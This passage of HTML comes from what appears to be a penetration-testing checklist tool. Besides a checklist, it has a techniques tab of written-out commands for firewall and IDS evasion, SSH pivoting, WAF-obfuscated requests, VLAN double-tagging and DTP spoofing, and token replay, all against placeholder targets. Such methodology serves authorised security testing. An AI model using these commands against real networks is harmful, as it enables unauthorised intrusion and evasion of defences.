                    <dd id="project-scope">Internal network (10.0.0.0/8)</dd>
                </div>
            </div>
        </section>

        <!-- Progress Section -->
        <section class="progress-section">
            <div class="section-header">
                <h2 class="section-title">Testing Progress</h2>
            </div>
            <div class="progress-grid">
                <div class="progress-card progress-overall">
                    <div class="progress-card-header">
                        <h3 class="progress-card-title"><i class="fas fa-tasks"></i> Overall Progress</h3>
                        <span id="overall-progress" class="progress-percentage">14%</span>
                    </div>
                    <div class="progress-bar">
                        <div id="overall-progress-bar" class="progress-value" style="width: 14%;"></div>
                    </div>
                    <div class="progress-details">
                        <span>Completed Tasks</span>
                        <span>Overall Completion</span>
                    </div>
                </div>
                <div class="progress-card progress-critical">
                    <div class="progress-card-header">
                        <h3 class="progress-card-title"><i class="fas fa-exclamation-triangle"></i> Critical Items</h3>
                        <span id="critical-progress" class="progress-percentage">13/118</span>
                    </div>
                    <div class="progress-bar">
                        <div id="critical-progress-bar" class="progress-value" style="width: 11%;"></div>
                    </div>
                    <div class="progress-details">
                        <span>Critical Security Checks</span>
                        <span>High Priority</span>
                    </div>
                </div>
                <div class="progress-card progress-high">
                    <div class="progress-card-header">
                        <h3 class="progress-card-title"><i class="fas fa-arrow-circle-up"></i> High Priority</h3>
                        <span id="high-progress" class="progress-percentage">3/120</span>
                    </div>
                    <div class="progress-bar">
                        <div id="high-progress-bar" class="progress-value" style="width: 3%;"></div>
                    </div>
                    <div class="progress-details">
                        <span>High-Risk Vulnerabilities</span>
                        <span>Important Tests</span>
                    </div>
                </div>
                <div class="progress-card progress-medium">
                    <div class="progress-card-header">
                        <h3 class="progress-card-title"><i class="fas fa-arrow-circle-right"></i> Medium Priority</h3>
                        <span id="medium-progress" class="progress-percentage">22/42</span>
                    </div>
                    <div class="progress-bar">
                        <div id="medium-progress-bar" class="progress-value" style="width: 52%;"></div>
                    </div>
                    <div class="progress-details">
                        <span>Standard Security Checks</span>
                        <span>Medium Risk</span>
                    </div>
                </div>
            </div>
        </section>

        <!-- Categories Section -->
        <section id="categories-section" class="categories-section" style="display: none;">
            <div class="section-header">
                <h2 class="section-title">Network Testing Categories</h2>
            </div>
            <div class="categories-grid"><div class="category-card" data-category="reconnaissance">
                    <div class="priority-medium">medium Priority</div>
                    <div class="category-content">
                        <div class="category-header">
                            <div class="category-icon">
                                <i class="fas fa-search" style="color: var(--info);"></i>
                            </div>
                            <h3 class="category-title">1. Reconnaissance &amp; Intelligence Gathering</h3>
                        </div>
                        <p class="category-description">Collecting information about the target network without active scanning</p>
                        <div class="category-footer">
                            <span class="category-progress" id="reconnaissance-progress">94% complete</span>
                            <span class="view-tests">View tests <i class="fas fa-arrow-right"></i></span>
                        </div>
                    </div>
                </div><div class="category-card" data-category="network-scanning">
                    <div class="priority-critical">critical Priority</div>
                    <div class="category-content">
                        <div class="category-header">
                            <div class="category-icon">
                                <i class="fas fa-network-wired" style="color: var(--danger);"></i>
                            </div>
                            <h3 class="category-title">2. Network Scanning &amp; Enumeration</h3>
                        </div>
                        <p class="category-description">Mapping the network, discovering hosts, and identifying services</p>
                        <div class="category-footer">
                            <span class="category-progress" id="network-scanning-progress">21% complete</span>
                            <span class="view-tests">View tests <i class="fas fa-arrow-right"></i></span>
                        </div>
                    </div>
                </div><div class="category-card" data-category="vulnerability-assessment">
                    <div class="priority-high">high Priority</div>
                    <div class="category-content">
                        <div class="category-header">
                            <div class="category-icon">
                                <i class="fas fa-bug" style="color: var(--warning);"></i>
                            </div>
                            <h3 class="category-title">3. Vulnerability Assessment</h3>
                        </div>
                        <p class="category-description">Identifying security weaknesses in network systems and services</p>
                        <div class="category-footer">
                            <span class="category-progress" id="vulnerability-assessment-progress">0% complete</span>
                            <span class="view-tests">View tests <i class="fas fa-arrow-right"></i></span>
                        </div>
                    </div>
                </div><div class="category-card" data-category="exploitation">
                    <div class="priority-critical">critical Priority</div>
                    <div class="category-content">
                        <div class="category-header">
                            <div class="category-icon">
                                <i class="fas fa-user-secret" style="color: var(--danger);"></i>
                            </div>
                            <h3 class="category-title">4. Network Exploitation</h3>
                        </div>
                        <p class="category-description">Exploiting identified vulnerabilities to gain access to network systems</p>
                        <div class="category-footer">
                            <span class="category-progress" id="exploitation-progress">0% complete</span>
                            <span class="view-tests">View tests <i class="fas fa-arrow-right"></i></span>
                        </div>
                    </div>
                </div><div class="category-card" data-category="post-exploitation">
                    <div class="priority-high">high Priority</div>
                    <div class="category-content">
                        <div class="category-header">
                            <div class="category-icon">
                                <i class="fas fa-flag" style="color: var(--warning);"></i>
                            </div>
                            <h3 class="category-title">5. Post-Exploitation</h3>
                        </div>
                        <p class="category-description">Actions taken after gaining access to network systems</p>
                        <div class="category-footer">
                            <span class="category-progress" id="post-exploitation-progress">0% complete</span>
                            <span class="view-tests">View tests <i class="fas fa-arrow-right"></i></span>
                        </div>
                    </div>
                </div><div class="category-card" data-category="wireless">
                    <div class="priority-high">high Priority</div>
                    <div class="category-content">
                        <div class="category-header">
                            <div class="category-icon">
                                <i class="fas fa-wifi" style="color: var(--warning);"></i>
                            </div>
                            <h3 class="category-title">6. Wireless Network Testing</h3>
                        </div>
                        <p class="category-description">Assessing security of WiFi, Bluetooth, and other wireless technologies</p>
                        <div class="category-footer">
                            <span class="category-progress" id="wireless-progress">0% complete</span>
                            <span class="view-tests">View tests <i class="fas fa-arrow-right"></i></span>
                        </div>
                    </div>
                </div><div class="category-card" data-category="infrastructure">
                    <div class="priority-critical">critical Priority</div>
                    <div class="category-content">
                        <div class="category-header">
                            <div class="category-icon">
                                <i class="fas fa-server" style="color: var(--danger);"></i>
                            </div>
                            <h3 class="category-title">7. Infrastructure Security Assessment</h3>
                        </div>
                        <p class="category-description">Evaluating security of network infrastructure devices and defensive systems</p>
                        <div class="category-footer">
                            <span class="category-progress" id="infrastructure-progress">0% complete</span>
                            <span class="view-tests">View tests <i class="fas fa-arrow-right"></i></span>
                        </div>
                    </div>
                </div><div class="category-card" data-category="active-directory">
                    <div class="priority-critical">critical Priority</div>
                    <div class="category-content">
                        <div class="category-header">
                            <div class="category-icon">
                                <i class="fas fa-users-cog" style="color: var(--danger);"></i>
                            </div>
                            <h3 class="category-title">8. Active Directory &amp; Identity Testing</h3>
                        </div>
                        <p class="category-description">Assessing security of directory services and authentication mechanisms</p>
                        <div class="category-footer">
                            <span class="category-progress" id="active-directory-progress">36% complete</span>
                            <span class="view-tests">View tests <i class="fas fa-arrow-right"></i></span>
                        </div>
                    </div>
                </div><div class="category-card" data-category="industrial-control">
                    <div class="priority-critical">critical Priority</div>
                    <div class="category-content">
                        <div class="category-header">
                            <div class="category-icon">
                                <i class="fas fa-industry" style="color: var(--danger);"></i>
                            </div>
                            <h3 class="category-title">9. Industrial Control Systems Testing</h3>
                        </div>
                        <p class="category-description">Assessing security of SCADA and ICS environments</p>
                        <div class="category-footer">
                            <span class="category-progress" id="industrial-control-progress">0% complete</span>
                            <span class="view-tests">View tests <i class="fas fa-arrow-right"></i></span>
                        </div>
                    </div>
                </div><div class="category-card" data-category="cloud-network">
                    <div class="priority-high">high Priority</div>
                    <div class="category-content">
                        <div class="category-header">
                            <div class="category-icon">
                                <i class="fas fa-cloud" style="color: var(--warning);"></i>
                            </div>
                            <h3 class="category-title">10. Cloud Network Security</h3>
                        </div>
                        <p class="category-description">Testing security of cloud-based network infrastructure</p>
                        <div class="category-footer">
                            <span class="category-progress" id="cloud-network-progress">13% complete</span>
                            <span class="view-tests">View tests <i class="fas fa-arrow-right"></i></span>
                        </div>
                    </div>
                </div><div class="category-card" data-category="container-networks">
                    <div class="priority-high">high Priority</div>
                    <div class="category-content">
                        <div class="category-header">
                            <div class="category-icon">
                                <i class="fas fa-cubes" style="color: var(--warning);"></i>
                            </div>
                            <h3 class="category-title">11. Container &amp; Virtualization Networks</h3>
                        </div>
                        <p class="category-description">Testing security of container orchestration and virtualized networks</p>
                        <div class="category-footer">
                            <span class="category-progress" id="container-networks-progress">0% complete</span>
                            <span class="view-tests">View tests <i class="fas fa-arrow-right"></i></span>
                        </div>
                    </div>
                </div><div class="category-card" data-category="protocol-analysis">
                    <div class="priority-medium">medium Priority</div>
                    <div class="category-content">
                        <div class="category-header">
                            <div class="category-icon">
                                <i class="fas fa-exchange-alt" style="color: var(--secondary);"></i>
                            </div>
                            <h3 class="category-title">12. Network Protocol Analysis</h3>
                        </div>
                        <p class="category-description">In-depth evaluation of network protocol implementations and security</p>
                        <div class="category-footer">
                            <span class="category-progress" id="protocol-analysis-progress">21% complete</span>
                            <span class="view-tests">View tests <i class="fas fa-arrow-right"></i></span>
                        </div>
                    </div>
                </div></div>
        </section>

        <!-- Category Details Section -->
        <section id="category-details" class="category-details" style="display: block;">
            <div class="details-header">
                <a href="#" id="btn-back" class="back-button">
                    <i class="fas fa-arrow-left"></i>
                    <span>Back to categories</span>
                </a>
                <h2 id="details-title" class="details-title">7. Infrastructure Security Assessment</h2>
                <p id="details-subtitle" class="details-subtitle">Evaluating security of network infrastructure devices and defensive systems</p>
            </div>
            <div class="details-content">
                <div class="tab-nav">
                    <a href="#" class="tab-link" data-tab="checklist">Checklist</a>
                    <a href="#" class="tab-link active" data-tab="techniques">Techniques</a>
                    <a href="#" class="tab-link" data-tab="tools">Tools</a>
                    <a href="#" class="tab-link" data-tab="notes">Notes</a>
                </div>
                
                <div id="tab-contents">
                    <div id="checklist-tab" class="tab-content">
                        <div class="checklist-group">
                            <h3 class="checklist-group-title">7.1 Firewall &amp; Access Control Assessment</h3>
                    
                        <div class="task-item" data-task-id="7.1.1">
                            <div class="task-status">
                                <div class="status-controls">
                                    <button type="button" class="status-btn active" data-status="not-tested" aria-label="Mark as not tested"></button>
                                    <button type="button" class="status-btn" data-status="passed" aria-label="Mark as passed"></button>
                                    <button type="button" class="status-btn na" data-status="na" aria-label="Mark as not applicable">N/A</button>
                                </div>
                            </div>
                            <div class="task-text">Test firewall rule effectiveness</div>
                        </div>
                    
                        <div class="task-item" data-task-id="7.1.2">
                            <div class="task-status">
                                <div class="status-controls">
                                    <button type="button" class="status-btn active" data-status="not-tested" aria-label="Mark as not tested"></button>
                                    <button type="button" class="status-btn" data-status="passed" aria-label="Mark as passed"></button>
                                    <button type="button" class="status-btn na" data-status="na" aria-label="Mark as not applicable">N/A</button>
                                </div>
                            </div>
                            <div class="task-text">Identify firewall evasion opportunities</div>
                        </div>
                    
                        <div class="task-item" data-task-id="7.1.3">
                            <div class="task-status">
                                <div class="status-controls">
                                    <button type="button" class="status-btn active" data-status="not-tested" aria-label="Mark as not tested"></button>
                                    <button type="button" class="status-btn" data-status="passed" aria-label="Mark as passed"></button>
                                    <button type="button" class="status-btn na" data-status="na" aria-label="Mark as not applicable">N/A</button>
                                </div>
                            </div>
                            <div class="task-text">Assess NAT configurations</div>
                        </div>
                    
                        <div class="task-item" data-task-id="7.1.4">
                            <div class="task-status">
                                <div class="status-controls">
                                    <button type="button" class="status-btn active" data-status="not-tested" aria-label="Mark as not tested"></button>
                                    <button type="button" class="status-btn" data-status="passed" aria-label="Mark as passed"></button>
                                    <button type="button" class="status-btn na" data-status="na" aria-label="Mark as not applicable">N/A</button>
                                </div>
                            </div>
                            <div class="task-text">Evaluate stateful inspection capabilities</div>
                        </div>
                    
                        <div class="task-item" data-task-id="7.1.5">
                            <div class="task-status">
                                <div class="status-controls">
                                    <button type="button" class="status-btn active" data-status="not-tested" aria-label="Mark as not tested"></button>
                                    <button type="button" class="status-btn" data-status="passed" aria-label="Mark as passed"></button>
                                    <button type="button" class="status-btn na" data-status="na" aria-label="Mark as not applicable">N/A</button>
                                </div>
                            </div>
                            <div class="task-text">Test firewall high availability and failover mechanisms</div>
                        </div>
                    
                        <div class="task-item" data-task-id="7.1.6">
                            <div class="task-status">
                                <div class="status-controls">
                                    <button type="button" class="status-btn active" data-status="not-tested" aria-label="Mark as not tested"></button>
                                    <button type="button" class="status-btn" data-status="passed" aria-label="Mark as passed"></button>
                                    <button type="button" class="status-btn na" data-status="na" aria-label="Mark as not applicable">N/A</button>
                                </div>
                            </div>
                            <div class="task-text">Assess next-generation firewall capabilities</div>
                        </div>
                    </div>
                        <div class="checklist-group">
                            <h3 class="checklist-group-title">7.2 IDS/IPS Evaluation</h3>
                    
                        <div class="task-item" data-task-id="7.2.1">
                            <div class="task-status">
                                <div class="status-controls">
                                    <button type="button" class="status-btn active" data-status="not-tested" aria-label="Mark as not tested"></button>
                                    <button type="button" class="status-btn" data-status="passed" aria-label="Mark as passed"></button>
                                    <button type="button" class="status-btn na" data-status="na" aria-label="Mark as not applicable">N/A</button>
                                </div>
                            </div>
                            <div class="task-text">Test detection capabilities of IDS/IPS systems</div>
                        </div>
                    
                        <div class="task-item" data-task-id="7.2.2">
                            <div class="task-status">
                                <div class="status-controls">
                                    <button type="button" class="status-btn active" data-status="not-tested" aria-label="Mark as not tested"></button>
                                    <button type="button" class="status-btn" data-status="passed" aria-label="Mark as passed"></button>
                                    <button type="button" class="status-btn na" data-status="na" aria-label="Mark as not applicable">N/A</button>
                                </div>
                            </div>
                            <div class="task-text">Assess alert thresholds and false positive rates</div>
                        </div>
                    
                        <div class="task-item" data-task-id="7.2.3">
                            <div class="task-status">
                                <div class="status-controls">
                                    <button type="button" class="status-btn active" data-status="not-tested" aria-label="Mark as not tested"></button>
                                    <button type="button" class="status-btn" data-status="passed" aria-label="Mark as passed"></button>
                                    <button type="button" class="status-btn na" data-status="na" aria-label="Mark as not applicable">N/A</button>
                                </div>
                            </div>
                            <div class="task-text">Attempt IDS/IPS evasion techniques</div>
                        </div>
                    
                        <div class="task-item" data-task-id="7.2.4">
                            <div class="task-status">
                                <div class="status-controls">
                                    <button type="button" class="status-btn active" data-status="not-tested" aria-label="Mark as not tested"></button>
                                    <button type="button" class="status-btn" data-status="passed" aria-label="Mark as passed"></button>
                                    <button type="button" class="status-btn na" data-status="na" aria-label="Mark as not applicable">N/A</button>
                                </div>
                            </div>
                            <div class="task-text">Evaluate response actions for detected threats</div>
                        </div>
                    
                        <div class="task-item" data-task-id="7.2.5">
                            <div class="task-status">
                                <div class="status-controls">
                                    <button type="button" class="status-btn active" data-status="not-tested" aria-label="Mark as not tested"></button>
                                    <button type="button" class="status-btn" data-status="passed" aria-label="Mark as passed"></button>
                                    <button type="button" class="status-btn na" data-status="na" aria-label="Mark as not applicable">N/A</button>
                                </div>
                            </div>
                            <div class="task-text">Test IDS/IPS signature coverage and effectiveness</div>
                        </div>
                    
                        <div class="task-item" data-task-id="7.2.6">
                            <div class="task-status">
                                <div class="status-controls">
                                    <button type="button" class="status-btn active" data-status="not-tested" aria-label="Mark as not tested"></button>
                                    <button type="button" class="status-btn" data-status="passed" aria-label="Mark as passed"></button>
                                    <button type="button" class="status-btn na" data-status="na" aria-label="Mark as not applicable">N/A</button>
                                </div>
                            </div>
                            <div class="task-text">Assess behavioral analysis and anomaly detection capabilities</div>
                        </div>
                    </div>
                        <div class="checklist-group">
                            <h3 class="checklist-group-title">7.3 Network Segmentation</h3>
                    
                        <div class="task-item" data-task-id="7.3.1">
                            <div class="task-status">
                                <div class="status-controls">
                                    <button type="button" class="status-btn active" data-status="not-tested" aria-label="Mark as not tested"></button>
                                    <button type="button" class="status-btn" data-status="passed" aria-label="Mark as passed"></button>
                                    <button type="button" class="status-btn na" data-status="na" aria-label="Mark as not applicable">N/A</button>
                                </div>
                            </div>
                            <div class="task-text">Assess VLAN implementation and security</div>
                        </div>
                    
                        <div class="task-item" data-task-id="7.3.2">
                            <div class="task-status">
                                <div class="status-controls">
                                    <button type="button" class="status-btn active" data-status="not-tested" aria-label="Mark as not tested"></button>
                                    <button type="button" class="status-btn" data-status="passed" aria-label="Mark as passed"></button>
                                    <button type="button" class="status-btn na" data-status="na" aria-label="Mark as not applicable">N/A</button>
                                </div>
                            </div>
                            <div class="task-text">Test network isolation between segments</div>
                        </div>
                    
                        <div class="task-item" data-task-id="7.3.3">
                            <div class="task-status">
                                <div class="status-controls">
                                    <button type="button" class="status-btn active" data-status="not-tested" aria-label="Mark as not tested"></button>
                                    <button type="button" class="status-btn" data-status="passed" aria-label="Mark as passed"></button>
                                    <button type="button" class="status-btn na" data-status="na" aria-label="Mark as not applicable">N/A</button>
                                </div>
                            </div>
                            <div class="task-text">Identify network segmentation bypass techniques</div>
                        </div>
                    
                        <div class="task-item" data-task-id="7.3.4">
                            <div class="task-status">
                                <div class="status-controls">
                                    <button type="button" class="status-btn active" data-status="not-tested" aria-label="Mark as not tested"></button>
                                    <button type="button" class="status-btn" data-status="passed" aria-label="Mark as passed"></button>
                                    <button type="button" class="status-btn na" data-status="na" aria-label="Mark as not applicable">N/A</button>
                                </div>
                            </div>
                            <div class="task-text">Evaluate access control between security zones</div>
                        </div>
                    
                        <div class="task-item" data-task-id="7.3.5">
                            <div class="task-status">
                                <div class="status-controls">
                                    <button type="button" class="status-btn active" data-status="not-tested" aria-label="Mark as not tested"></button>
                                    <button type="button" class="status-btn" data-status="passed" aria-label="Mark as passed"></button>
                                    <button type="button" class="status-btn na" data-status="na" aria-label="Mark as not applicable">N/A</button>
                                </div>
                            </div>
                            <div class="task-text">Test for VLAN hopping vulnerabilities</div>
                        </div>
                    
                        <div class="task-item" data-task-id="7.3.6">
                            <div class="task-status">
                                <div class="status-controls">
                                    <button type="button" class="status-btn active" data-status="not-tested" aria-label="Mark as not tested"></button>
                                    <button type="button" class="status-btn" data-status="passed" aria-label="Mark as passed"></button>
                                    <button type="button" class="status-btn na" data-status="na" aria-label="Mark as not applicable">N/A</button>
                                </div>
                            </div>
                            <div class="task-text">Evaluate microsegmentation implementations</div>
                        </div>
                    </div>
                        <div class="checklist-group">
                            <h3 class="checklist-group-title">7.4 Network Architecture</h3>
                    
                        <div class="task-item" data-task-id="7.4.1">
                            <div class="task-status">
                                <div class="status-controls">
                                    <button type="button" class="status-btn active" data-status="not-tested" aria-label="Mark as not tested"></button>
                                    <button type="button" class="status-btn" data-status="passed" aria-label="Mark as passed"></button>
                                    <button type="button" class="status-btn na" data-status="na" aria-label="Mark as not applicable">N/A</button>
                                </div>
                            </div>
                            <div class="task-text">Review network topology for security weaknesses</div>
                        </div>
                    
                        <div class="task-item" data-task-id="7.4.2">
                            <div class="task-status">
                                <div class="status-controls">
                                    <button type="button" class="status-btn active" data-status="not-tested" aria-label="Mark as not tested"></button>
                                    <button type="button" class="status-btn" data-status="passed" aria-label="Mark as passed"></button>
                                    <button type="button" class="status-btn na" data-status="na" aria-label="Mark as not applicable">N/A</button>
                                </div>
                            </div>
                            <div class="task-text">Assess DMZ implementation and security</div>
                        </div>
                    
                        <div class="task-item" data-task-id="7.4.3">
                            <div class="task-status">
                                <div class="status-controls">
                                    <button type="button" class="status-btn active" data-status="not-tested" aria-label="Mark as not tested"></button>
                                    <button type="button" class="status-btn" data-status="passed" aria-label="Mark as passed"></button>
                                    <button type="button" class="status-btn na" data-status="na" aria-label="Mark as not applicable">N/A</button>
                                </div>
                            </div>
                            <div class="task-text">Evaluate network device redundancy</div>
                        </div>
                    
                        <div class="task-item" data-task-id="7.4.4">
                            <div class="task-status">
                                <div class="status-controls">
                                    <button type="button" class="status-btn active" data-status="not-tested" aria-label="Mark as not tested"></button>
                                    <button type="button" class="status-btn" data-status="passed" aria-label="Mark as passed"></button>
                                    <button type="button" class="status-btn na" data-status="na" aria-label="Mark as not applicable">N/A</button>
                                </div>
                            </div>
                            <div class="task-text">Test network monitoring capabilities</div>
                        </div>
                    
                        <div class="task-item" data-task-id="7.4.5">
                            <div class="task-status">
                                <div class="status-controls">
                                    <button type="button" class="status-btn active" data-status="not-tested" aria-label="Mark as not tested"></button>
                                    <button type="button" class="status-btn" data-status="passed" aria-label="Mark as passed"></button>
                                    <button type="button" class="status-btn na" data-status="na" aria-label="Mark as not applicable">N/A</button>
                                </div>
                            </div>
                            <div class="task-text">Document infrastructure vulnerabilities with practical impact</div>
                        </div>
                    
                        <div class="task-item" data-task-id="7.4.6">
                            <div class="task-status">
                                <div class="status-controls">
                                    <button type="button" class="status-btn active" data-status="not-tested" aria-label="Mark as not tested"></button>
                                    <button type="button" class="status-btn" data-status="passed" aria-label="Mark as passed"></button>
                                    <button type="button" class="status-btn na" data-status="na" aria-label="Mark as not applicable">N/A</button>
                                </div>
                            </div>
                            <div class="task-text">Evaluate zero-trust implementation effectiveness</div>
                        </div>
                    </div></div>
                    
                    <div id="techniques-tab" class="tab-content active">
        <div class="techniques-list">
            <div class="technique-item">
                <h4 class="technique-title">Firewall Rule Testing Methodology</h4>
                <p class="technique-description">Comprehensive approach to validating firewall rule effectiveness.</p>
                <ol>
                    <li><strong>Baseline Mapping:</strong> Determine what traffic is normally allowed/blocked</li>
                    <li><strong>Rule Discovery:</strong> Systematically probe to identify specific rule patterns</li>
                    <li><strong>Evasion Testing:</strong> Attempt techniques to bypass identified rules</li>
                    <li><strong>State Testing:</strong> Evaluate how stateful inspection handles established connections</li>
                    <li><strong>Deep Packet Inspection:</strong> Test application layer filtering capabilities</li>
                    <li><strong>Protocol Manipulation:</strong> Test handling of protocol violations and edge cases</li>
                    <li><strong>Performance Testing:</strong> Evaluate behavior under load and during attacks</li>
                </ol>
                <pre class="code-block"># Basic firewall rule testing with nmap
# TCP connect scan
nmap -sT -p1-65535 target_ip

# SYN scan (requires root)
sudo nmap -sS -p1-65535 target_ip

# SYN scan with fragmentation
sudo nmap -sS -f -p1-65535 target_ip

# Testing with uncommon packet flags
sudo nmap -sX -p1-65535 target_ip  # XMAS scan
sudo nmap -sN -p1-65535 target_ip  # NULL scan
sudo nmap -sF -p1-65535 target_ip  # FIN scan

# Using specific source ports that might be allowed
sudo nmap -sS -p1-65535 --source-port 53 target_ip  # DNS source port
sudo nmap -sS -p1-65535 --source-port 80 target_ip  # HTTP source port

# Advanced firewall testing with hping3
sudo hping3 -S -p 80 -c 5 target_ip  # SYN to port 80
sudo hping3 -SA -p 80 -c 5 target_ip  # SYN+ACK to port 80

# Testing next-generation firewall application identification
# Custom crafted HTTP request with evasion techniques
echo -e "GET / HTTP/1.1
Host: internal.server
X-Forwarded-For: 192.168.1.1
User-Agent: Mozilla/5.0

" | nc -v target_ip 80</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">IDS/IPS Evasion Techniques</h4>
                <p class="technique-description">Methods to test evasion resistance of intrusion detection and prevention systems.</p>
                <ul>
                    <li><strong>Fragmentation:</strong> Splitting attack payloads across multiple packets</li>
                    <li><strong>Timing:</strong> Slowing attack execution below detection thresholds</li>
                    <li><strong>Obfuscation:</strong> Encoding attack patterns to avoid signature detection</li>
                    <li><strong>Protocol Abuse:</strong> Manipulating protocol fields in non-standard ways</li>
                    <li><strong>Encryption:</strong> Using encrypted channels to hide attack traffic</li>
                    <li><strong>Polymorphism:</strong> Using variable encodings for the same attack</li>
                    <li><strong>Traffic Manipulation:</strong> Adding noise or chaff to disguise attack pattern</li>
                </ul>
                <pre class="code-block"># Packet fragmentation with fragroute
echo "fragment:250" &gt; frag.conf
fragroute -f frag.conf target_ip

# Slow scanning with nmap
sudo nmap -sS -T0 -p 22,80,443 target_ip

# Using encryption to evade IDS
# SSH tunneling
ssh -D 9050 user@pivot_host
proxychains nmap -sT -p1-1000 target_internal_ip

# Testing Snort IDS evasion
# Using tool like IDSWakeup
./idswakeup eth0 target_ip MyNetwork
# or Pytbull for comprehensive testing
python pytbull.py -t evasion -m all -d 192.168.1.0/24

# Obfuscating HTTP traffic to evade WAF/NIDS
# Unicode encoding in URLs
curl "http://target_ip/login.php?username=%u0075%u0073%u0065%u0072&amp;password=%u0070%u0061%u0073%u0073"

# Testing HTTP parameter pollution
curl "http://target_ip/search.php?q=normal&amp;q=alert(1)"

# Testing traffic normalization capabilities
scapy
# In Python with Scapy
send(IP(dst="target_ip", flags="MF")/TCP(dport=80, flags="S")/("A"*10))
send(IP(dst="target_ip", frag=1)/("B"*10))</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">VLAN Hopping Attack Methods</h4>
                <p class="technique-description">Techniques to test the security of VLAN implementations.</p>
                <pre class="code-block"># Double tagging attack with Yersinia
yersinia -G

# Tagging attack with scapy
sudo python3
from scapy.all import *
# Create a double-tagged 802.1q packet
packet = Ether()/Dot1Q(vlan=10)/Dot1Q(vlan=20)/IP(dst="target_ip")/ICMP()
sendp(packet, iface="eth0")

# Switch spoofing using DTP
# First enable DTP mode
yersinia dtp -attack 1

# Testing for native VLAN issues
# Create packet with no VLAN tag to target native VLAN
packet = Ether()/IP(dst="target_ip")/ICMP()
sendp(packet, iface="eth0")

# VLAN enumeration with CDP/LLDP inspection
sudo tcpdump -nn -v -i eth0 -s 1500 -c 1 'ether[20:2] == 0x2000'
sudo tcpdump -nn -v -i eth0 -s 1500 -c 1 '(ether[12:2]=0x88cc)'

# Using Nmap NSE scripts for VLAN discovery
sudo nmap --script broadcast-vlan-discovery</pre>
                <p>Key VLAN security aspects to test:</p>
                <ul>
                    <li>Dynamic Trunking Protocol (DTP) misconfigurations</li>
                    <li>Native VLAN vulnerabilities</li>
                    <li>Trunk port security measures</li>
                    <li>VLAN access control list implementation</li>
                    <li>Private VLAN isolation effectiveness</li>
                    <li>VLAN management interface security</li>
                    <li>Inter-VLAN routing controls</li>
                </ul>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Zero Trust Architecture Assessment</h4>
                <p class="technique-description">Techniques for evaluating zero trust implementation effectiveness.</p>
                <pre class="code-block"># Testing identity verification
# Attempt access with valid but unauthorized credentials
curl -X POST https://api.target.com/resource   -H "Authorization: Bearer validUserToken"

# Testing device verification
# Spoof device fingerprint attributes
curl -X GET https://api.target.com/resource   -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"   -H "X-Device-ID: validDeviceID"   -H "Authorization: Bearer validToken"

# Testing least privilege access
# Attempt to access resources beyond assigned scope
for endpoint in $(cat endpoints.txt); do
  curl -X GET "https://api.target.com$endpoint"     -H "Authorization: Bearer validToken"
done

# Testing for proper session validation
# Replay captured access token after timeout period
sleep 3600
curl -X GET https://api.target.com/resource   -H "Authorization: Bearer capturedToken"

# Testing micro-segmentation escape
# From container/VM with limited access
curl -X GET http://neighboring-service:8080/</pre>
            </div>
        </div>
        </div>
                    
                    <div id="tools-tab" class="tab-content">
        <div class="tools-grid">
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-shield-alt tool-icon"></i>
                    <h4 class="tool-title">Firewall Analyzer</h4>
                </div>
                <p class="tool-description">Tool for auditing and analyzing firewall rule configurations for security gaps and optimization.</p>
                <a href="https://www.manageengine.com/products/firewall/" target="_blank" class="tool-link">
                    <span>Website</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-eye-slash tool-icon"></i>
                    <h4 class="tool-title">Fragroute</h4>
                </div>
                <p class="tool-description">Network tool for testing fragmentation handling and IDS evasion capabilities.</p>
                <a href="https://github.com/stsi/fragroute-debian" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-random tool-icon"></i>
                    <h4 class="tool-title">Yersinia</h4>
                </div>
                <p class="tool-description">Framework for layer 2 protocol attacks including VLAN hopping, STP manipulation, and more.</p>
                <a href="https://github.com/tomac/yersinia" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-network-wired tool-icon"></i>
                    <h4 class="tool-title">hping3</h4>
                </div>
                <p class="tool-description">Advanced packet crafting tool excellent for firewall rule testing and network probing.</p>
                <a href="https://github.com/antirez/hping" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-sitemap tool-icon"></i>
                    <h4 class="tool-title">Scapy</h4>
                </div>
                <p class="tool-description">Powerful interactive packet manipulation program for crafting custom network packets.</p>
                <a href="https://scapy.net/" target="_blank" class="tool-link">
                    <span>Website</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-filter tool-icon"></i>
                    <h4 class="tool-title">WAFWoof</h4>
                </div>
                <p class="tool-description">Tool for identifying and fingerprinting Web Application Firewall products.</p>
                <a href="https://github.com/EnableSecurity/wafw00f" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
        </div>
        </div>
                    
                    <div id="notes-tab" class="tab-content">
                        <div class="notes-form">
                            <label for="category-notes" class="form-label">Testing Notes for this Category</label>
                            <textarea id="category-notes" class="notes-textarea" placeholder="Add specific findings, observations, or commands used..."></textarea>
                            <button id="btn-save-notes" class="btn btn-primary">
                                <i class="fas fa-save"></i>
                                <span>Save Notes</span>
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!-- Findings Section -->
        <section class="findings-section">
            <div class="findings-header">
                <h2 class="section-title">Vulnerability Findings</h2>
                <div class="header-actions">
                    <button id="btn-add-finding" class="btn btn-success">
                        <i class="fas fa-plus"></i>
                        <span>Add Finding</span>
                    </button>
                    <button id="btn-generate-report" class="btn btn-primary">
                        <i class="fas fa-file-alt"></i>
                        <span>Generate Report</span>
                    </button>
                </div>
            </div>
            <div class="findings-table-container">
                <table class="findings-table">
                    <thead>
                        <tr>
                            <th>Category</th>
                            <th class="text-center">High</th>
                            <th class="text-center">Medium</th>
                            <th class="text-center">Low</th>
                            <th class="text-center">Info</th>
                            <th class="text-center">Total</th>
                            <th>Actions</th>
                        </tr>
